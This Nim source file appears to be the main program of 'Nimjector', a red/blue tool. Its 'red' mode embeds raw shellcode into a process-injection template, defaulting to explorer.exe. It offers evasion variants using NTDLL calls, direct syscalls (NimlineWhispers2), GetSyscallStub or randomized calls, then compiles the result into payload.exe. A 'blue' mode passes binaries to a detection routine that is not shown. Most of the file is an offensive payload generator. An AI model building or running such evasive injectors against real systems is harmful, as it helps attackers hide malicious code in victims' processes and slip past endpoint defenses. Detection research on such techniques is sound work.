import docopt, os, base64
include utils/utils

let doc = """
Nimjector v 1.0

Usage:
  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-n]
  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-s] 
  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-r] 
  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-g] 
  nimjector blue -f binary
  nimjector (-h | --help)
  nimjector --version

Options:
  -h --help     		Show this screen.
  --version     		Show version.
  -i --image shellcode.bin	File to load
  -f --file binary		Binary to analyze
  -t --technique technique_name Name of technique
  -P --print  			Print the template instead of writing into a file
  -p --process 			Target process to be spawned or injected
  -e --encrypt 			Encrypts the shellcode 
  -n --nt  			Use NTDLL calls instead of Kernel32
  -s --syscalls  		Use Syscalls via NimlineWhisphers2
  -g --gstub   			Use GetSyscallStub
  -r --randomized  		Use randomized calls (Kernel32, NTDLL, Syscalls, GetSyscallStub)
"""

var template_output: string = "payload.nim"

let args = docopt(doc, version = "Nimjector 1.0")
let technique_list = get_techniques("models/techniques.yml")

echo args
# For payload creation
if args["red"]:
  let technique = $args["--technique"]
  let shellcode_file = $args["--image"]

  var process = $args["--process"]
  if process == "nil":
     process = "explorer.exe"
 
  let shellcode = readFile(shellcode_file)

  var variation = "kernel32"   
  if args["--nt"]:
    variation = "ntdll"
  if args["--syscalls"]:
    variation = "syscalls"
  if args["--gstub"]:
    variation = "gstub"
  if args["--randomized"]:
    variation = "randomized"

  var modules = get_modules(technique, variation)
  var setup = get_init_setup(technique, technique_list, variation)

  var payload = build_template(technique, technique_list, variation)
  payload = payload.replace("REPLACE_MODULES", modules)
  payload = payload.replace("REPLACE_INIT_SETUP", setup)
  payload = payload.replace("REPLACE_SHELLCODE", encode(shellcode))
  payload = payload.replace("REPLACE_PROCESS", process)
  
  if args["--print"]:
    echo payload

  else:
    writeFile(template_output, payload)
    colored_print("[+] Payload written to payload.nim", fgGreen)

    colored_print("[+] Compiling payload.nim", fgGreen)
    let res = os.execShellCmd("nim c payload.nim")
    if res == 0:
      colored_print("[+] Successfully compiled payload.exe", fgGreen)
    else:
      colored_print("[!] Failed to compile payload.exe", fgRed)
  
# For detection    
if args["blue"]:
  let bin = $args["--file"]
  process_binary(bin, technique_list)

#build_template(technique, technique_list, template_output)

# For binary checking
#let technique_list = get_techniques("models/techniques.yml")

#let arguments = custom_arguments("models/custom_arguments.yml")
